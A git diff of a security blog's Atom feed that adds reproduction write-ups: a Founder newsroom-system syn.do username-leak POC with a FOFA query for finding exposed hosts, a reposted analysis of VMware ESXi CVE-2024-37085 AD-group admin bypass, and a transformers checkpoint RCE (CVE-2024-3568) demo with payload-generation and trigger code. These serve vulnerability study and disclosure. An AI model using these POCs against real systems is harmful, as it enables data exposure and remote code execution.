@@ -4,8 +4,8 @@
     <title>余香</title>
     <link href="http://example.com" />
     <updated>2025-02-11T08:02:07.000Z</updated>
-    <category term="日常小工具" />
     <category term="漏洞复现" />
+    <category term="日常小工具" />
     <category term="神兵利器" />
     <category term="应急响应" />
     <entry>
@@ -55,9 +55,26 @@
         <updated>2025-02-10T07:25:51.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2024/12/26/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
+        <id>http://example.com/2024/12/27/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</id>
+        <title>方正全媒体采编系统存在syn.do信息泄露漏洞</title>
+        <link rel="alternate" href="http://example.com/2024/12/27/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
+        <content type="html">&lt;h1 id=&#34;方正全媒体采编系统存在syndo信息泄露漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#方正全媒体采编系统存在syndo信息泄露漏洞&#34;&gt;#&lt;/a&gt; 方正全媒体采编系统存在 syn.do 信息泄露漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;1-漏洞介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-漏洞介绍&#34;&gt;#&lt;/a&gt; 1、漏洞介绍&lt;/h2&gt;
+&lt;p&gt;​	方正全媒体采编系统存在 syn.do 信息泄露漏洞，攻击者可以查看到平台中所有用户的用户名。&lt;/p&gt;
+&lt;h2 id=&#34;2-fofa语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-fofa语句&#34;&gt;#&lt;/a&gt; 2、 fofa 语句&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;app=&amp;quot;FOUNDER-全媒体采编系统&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;3-poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-poc&#34;&gt;#&lt;/a&gt; 3、POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /newsedit/assess/syn.do?type=org HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 185Accept: */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;4-验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-验证&#34;&gt;#&lt;/a&gt; 4、验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1724056279042-c14e8c27-b358-4e33-97da-1c74b71c8427.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="漏洞复现" />
+        <updated>2024-12-27T08:43:09.288Z</updated>
+    </entry>
+    <entry>
+        <id>http://example.com/2024/12/27/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
         <title>HTTP请求走私漏洞</title>
-        <link rel="alternate" href="http://example.com/2024/12/26/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
+        <link rel="alternate" href="http://example.com/2024/12/27/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
         <content type="html">&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/056b.jpg&#34; alt=&#34;device&#34;&gt;&lt;/p&gt;
 &lt;h1 id=&#34;http请求走私漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http请求走私漏洞&#34;&gt;#&lt;/a&gt; HTTP 请求走私漏洞&lt;/h1&gt;
 &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
@@ -123,7 +140,260 @@ Content-Length 标头：它指定消息体的以字节为单位的长度。例�
 &lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241226143049.png&#34; alt=&#34;20241226143049&#34;&gt;&lt;/p&gt;
 </content>
         <category term="神兵利器" />
-        <updated>2024-12-26T06:00:58.580Z</updated>
+        <updated>2024-12-27T08:41:15.410Z</updated>
+    </entry>
+    <entry>
+        <id>http://example.com/2024/12/27/VMware%20ESXi%20CVE-2024-37085/</id>
+        <title>VMware ESXi CVE-2024-37085漏洞验证分析</title>
+        <link rel="alternate" href="http://example.com/2024/12/27/VMware%20ESXi%20CVE-2024-37085/"/>
+        <content type="html">&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/b906bb43fbf2b211b9e52d27c78065380dd78e4b.jpg&#34; alt=&#34;device&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;漏洞描述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h1&gt;
+&lt;p&gt;🍘近日，微软披露了一个 ESXi 漏洞（编号为 CVE-2024-37085）的在野攻击报告 [1]。该漏洞是 VMware ESXi 的一个认证绕过漏洞，已被多个勒索软件所利用。通过该漏洞，攻击者可获取加入 AD 域的 ESXi 的完全操作权限，控制该 ESXi 中包含的虚拟机等。&lt;br&gt;
+漏洞的 NVD 描述为 [2]：VMware ESXi contains an authentication bypass vulnerability. A malicious actor with sufficient Active Directory (AD) permissions can gain full access to an ESXi host that was previously configured to use AD for user management by re-creating the configured AD group (‘ESXi Admins’ by default) after it was deleted from AD。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞影响版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞影响版本&#34;&gt;#&lt;/a&gt; 漏洞影响版本&lt;/h2&gt;
+&lt;p&gt;官方发布的 ESXi 影响版本：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Version&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Running On&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi&lt;/td&gt;
+&lt;td&gt;8.0&lt;/td&gt;
+&lt;td&gt;Any&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi&lt;/td&gt;
+&lt;td&gt;7.0&lt;/td&gt;
+&lt;td&gt;Any&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;经过启明星辰 ADLab 的测试和验证，发现低版本的 ESXi 同样受影响。实测的 ESXi 影响版本&lt;br&gt;
+：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;漏洞存在性&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 8.0&lt;/td&gt;
+&lt;td&gt;存在&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 7.0&lt;/td&gt;
+&lt;td&gt;存在&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 6.7&lt;/td&gt;
+&lt;td&gt;存在&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 5.5&lt;/td&gt;
+&lt;td&gt;存在&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;漏洞机制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞机制&#34;&gt;#&lt;/a&gt; 漏洞机制&lt;/h2&gt;
+&lt;p&gt;根据官方文档的描述 [3]，为了方便管理大量 ESXi 主机，VMware ESXi 支持通过 Active Directory (AD) 来管理账号权限。其中，对于加入 AD 域的 ESXi 主机，默认设置了 AD 域 ESX Admins 用户组具有 ESXi 主机的管理员权限。因此，攻击者如果在 AD 域中能创建 ESX Admins 组或更改现有组为 ESX Admin，就能具备对加入该域的 ESXi 主机的完全控制。&lt;/p&gt;
+&lt;p&gt;微软研究人员披露了此漏洞的三种利用方式：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;创建并添加用户：创建 “ESX Admins” 组，添加用户，进而获得完全管理权限。&lt;/li&gt;
+&lt;li&gt;重命名组并添加用户：重命名现有组为 “ESX Admins”，添加用户或使用现有成员，进而获得完全管理权限。&lt;/li&gt;
+&lt;li&gt;权限刷新：在网络管理员把权限转移给 AD 域的其它组后，ESX Admins 组的管理权限不会立即消失，仍可被利用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;ADLab 研究员对三种利用方法进行了复现验证。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞验证&#34;&gt;#&lt;/a&gt; 漏洞验证&lt;/h2&gt;
+&lt;p&gt;本节的漏洞验证以 ESXi6.7 为例，域控在 Server2012 服务器中，ESXi6.7 加入了该域控。&lt;/p&gt;
+&lt;h3 id=&#34;1-方法一验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-方法一验证&#34;&gt;#&lt;/a&gt; 1、方法一验证&lt;/h3&gt;
+&lt;p&gt;（1）在 ESXi 6.7 加入域控后，域控默认是没有 ESX Admins 组的，如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/640&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（2）使用 test 账户登录 ESXi（该账号目前还不在”ESX Admins” 组内）。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/74e1d492e1f11f22b24e01a1942d5072.png&#34; alt=&#34;74e1d492e1f11f22b24e01a1942d5072&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	登录失败，提示操作权限被拒绝：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/b53cf5e0d9c153071145574bc7e0a4cf.png&#34; alt=&#34;b53cf5e0d9c153071145574bc7e0a4cf&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（3）使用 net group 命令，创建 1 个名为 ESX Admins 的用户组。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/8e963ed7a5d06ed6d752b7fa5ec1c36d.png&#34; alt=&#34;8e963ed7a5d06ed6d752b7fa5ec1c36d&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/d6de7d02d189544278ac5b30765d8f90.png&#34; alt=&#34;d6de7d02d189544278ac5b30765d8f90&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用 net group 命令，将 test 用户加入 ESX Admins 组：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/3a9d66d3de98c60c53a3a1c9ea2c3414.png&#34; alt=&#34;3a9d66d3de98c60c53a3a1c9ea2c3414&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1be60ace68d4c52cd161bb28904221ee.png&#34; alt=&#34;1be60ace68d4c52cd161bb28904221ee&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	使用 test 用户登录，能够登录成功且能执行高权限操作：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/c7f271856e079e8166227ae7a34eafb2.png&#34; alt=&#34;c7f271856e079e8166227ae7a34eafb2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/4dbba38acd842e1585ab18e6e67d93d0.png&#34; alt=&#34;4dbba38acd842e1585ab18e6e67d93d0&#34;&gt;&lt;/p&gt;
+&lt;p&gt;经测试，该方法在其它 ESXi 版本上也能成功，具体测试版本有：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;方法可利用&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 8.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 7.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 6.7&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 5.5&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;2-方法二验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-方法二验证&#34;&gt;#&lt;/a&gt; 2、 方法二验证&lt;/h3&gt;
+&lt;p&gt;（1）在 ESXi 6.7 加入域控后，域控默认是没有 ESX Admins 组。&lt;/p&gt;
+&lt;p&gt;（2）首先，创建 1 个名为 g1 的组，把 test 用户加到 g1 组，使用 test 登录 ESXi。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/20865897feabc077a1e9ed22ccdecccc.png&#34; alt=&#34;20865897feabc077a1e9ed22ccdecccc&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/51508ba363caa31cd39907a636ddecf1.png&#34; alt=&#34;51508ba363caa31cd39907a636ddecf1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	登录失败，提示操作权限被拒绝。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/413fa97a2f7212102613dcac055ff286.png&#34; alt=&#34;413fa97a2f7212102613dcac055ff286&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（3）然后，修改 g1 的名称为 ESX Admins。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/75eb50838691c37a155c6f06ba664fb4.png&#34; alt=&#34;75eb50838691c37a155c6f06ba664fb4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（4）最后，利用 test 用户登录 ESXi。&lt;/p&gt;
+&lt;p&gt;​	登录成功，查看权限为管理员&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/be274dd5a1ae02cd12c72c33565fa1b7.png&#34; alt=&#34;be274dd5a1ae02cd12c72c33565fa1b7&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	经测试，该方法在其它 ESXi 版本上也能成功，具体测试版本有：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;方法可利用&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 8.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 7.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 6.7&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 5.5&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;3-方法三验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-方法三验证&#34;&gt;#&lt;/a&gt; 3、方法三验证&lt;/h3&gt;
+&lt;p&gt;（1）在 ESXi 6.7 加入域控后，创建 ESX Admins 组和 g1 组，test 和 test2 分别加入 2 个组。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/e5da5caf050ecbf1ea65b559e8b33a1a.png&#34; alt=&#34;e5da5caf050ecbf1ea65b559e8b33a1a&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/56be2c204852bc6f54137d4750d686a8.png&#34; alt=&#34;56be2c204852bc6f54137d4750d686a8&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/da9a9506cc31bb6ca884b9a3966d3fdf.png&#34; alt=&#34;da9a9506cc31bb6ca884b9a3966d3fdf&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（2）登录 ESXi 尝试&lt;/p&gt;
+&lt;p&gt;​	用户 test 属于 ESX Admins 组，能够成功登录&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/4b0a5ecb77d69e60a05f63ca91aaf48b.png&#34; alt=&#34;4b0a5ecb77d69e60a05f63ca91aaf48b&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	用户 test2 属于 g1 组，登录失败，提示操作权限被拒绝。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/4b89328cc8c789285d80a67738a4fc20.png&#34; alt=&#34;4b89328cc8c789285d80a67738a4fc20&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（3）修改 ESXi 的配置，修改默认的域管理员组为 g1。&lt;/p&gt;
+&lt;p&gt;​	用户 test2 登录，能够登录成功。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/87fbcd5169a8c4aed65a9613fd800071.png&#34; alt=&#34;87fbcd5169a8c4aed65a9613fd800071&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	用户 test 登录，仍然能登录成功。尽管，此时 test 用户实际已经不属于 ESXi 配置的域管理员组。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/10aad9f69bd9393fbc146781346b19f1.png&#34; alt=&#34;10aad9f69bd9393fbc146781346b19f1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	经测试，该方法在其它 ESXi 版本上也能成功，具体测试版本有：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;方法可利用&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 8.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 7.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 6.7&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 5.5&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;漏洞修复&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h2&gt;
+&lt;p&gt;​	博通官方给了相关修复版本的 ESXi 下载链接和文档，将 ESXi 升级到最新的修复版本即可，补丁下载地址：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/security-advisories/0/24505&#34;&gt;https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/security-advisories/0/24505&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;文章转自启明星辰-adlabvmware-esxi-cve-2024-37085漏洞验证分析-qqcom&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文章转自启明星辰-adlabvmware-esxi-cve-2024-37085漏洞验证分析-qqcom&#34;&gt;#&lt;/a&gt; 文章转自启明星辰 [ADLab]：&lt;a href=&#34;https://mp.weixin.qq.com/s/IVgEogcJigvPCq5MI9eeyg&#34;&gt;VMware ESXi CVE-2024-37085 漏洞验证分析 (qq.com)&lt;/a&gt;&lt;/h3&gt;
+</content>
+        <category term="漏洞复现" />
+        <updated>2024-12-27T08:31:11.536Z</updated>
+    </entry>
+    <entry>
+        <id>http://example.com/2024/12/27/huggingfaceRCE/</id>
+        <title>huggingface/transformers RCE</title>
+        <link rel="alternate" href="http://example.com/2024/12/27/huggingfaceRCE/"/>
+        <content type="html">&lt;h1 id=&#34;huggingfacetransformers-rce漏洞分析-cve-2024-3568&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#huggingfacetransformers-rce漏洞分析-cve-2024-3568&#34;&gt;#&lt;/a&gt; huggingface/	transformers RCE 漏洞分析 （CVE-2024-3568）&lt;/h1&gt;
+&lt;h2 id=&#34;1-缘起&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-缘起&#34;&gt;#&lt;/a&gt; 1、缘起&lt;/h2&gt;
+&lt;p&gt;刚开始研究⼤模型安全的时候就看到 huggingface/transformers 有这个 load_repo_checkpoint 的漏洞，不过 当时看到说是利⽤起来⽐较困难就没有再深⼊研究（世上⽆难事，只要肯放弃），直到周五（2024-10-18）的时 候，看到各个技术群⾥都在转发字节跳动实习⽣对⼤模型投毒的聊天记录，故事情节相当精彩刺激，后来在知乎热 榜上也看到出现⾮常多的讨论，有兴趣的读者可⾃⾏吃⽠： &lt;a href=&#34;https://www.zhihu.com/question/1296528119&#34;&gt;字节跳动大模型训练被实习生恶意注入破坏代码，涉事者已被辞退，攻击带来的影响有多大？暴露出哪些问题？ - 知乎 (zhihu.com)&lt;/a&gt; 既然这个漏洞都已经能够在实际环境中产⽣危害了，感觉是有必要深⼊了解分析⼀下了&lt;/p&gt;
+&lt;h2 id=&#34;2-漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-漏洞复现&#34;&gt;#&lt;/a&gt; 2、漏洞复现&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;前置条件：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;安装的是 4.38.0 或之前的 transformer&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;pip install transformers==4.37.2&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt; pip install tensorflow&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;借助这个⼯具来进⾏漏洞复现：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://github.com/llm-sec/transformer-hacker&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先⽣成⼀个带 checkpoint 的⽂件夹，执⾏的命令是 Mac 下的打开计算器命令：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python main.py --directory ./rce-checkpoint --model bert-base-uncased --command &#39;open  /System/Applications/Calculator.app&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/image-20241024155859447.png&#34; alt=&#34;image-20241024155859447&#34;&gt;&lt;/p&gt;
+&lt;p&gt;⽣成好了 payload 之后，然后执⾏下⾯的代码，⽤这段代码来模拟模型训练加载 加载⽣成的带有命令执⾏的 checkpoint 的仓库⽂件夹： checkpoint 的过程，在⾥⾯尝试：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from tensorflow.keras.optimizers import Adam&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from transformers import TFAutoModel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 这个模型还是有些⼤的，下载可能会花⼀些时间...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # https://huggingface.co/google-bert/bert-base-uncased/tree/main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model = TFAutoModel.from_pretrained(&amp;#x27;bert-base-uncased&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model.compile(optimizer=Adam(learning_rate=5e-5), loss=&amp;#x27;sparse_categorical_crossentropy&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 把参数修改为checkpoint所在的仓库的路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;model.load_repo_checkpoint(&amp;#x27;test_repo&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
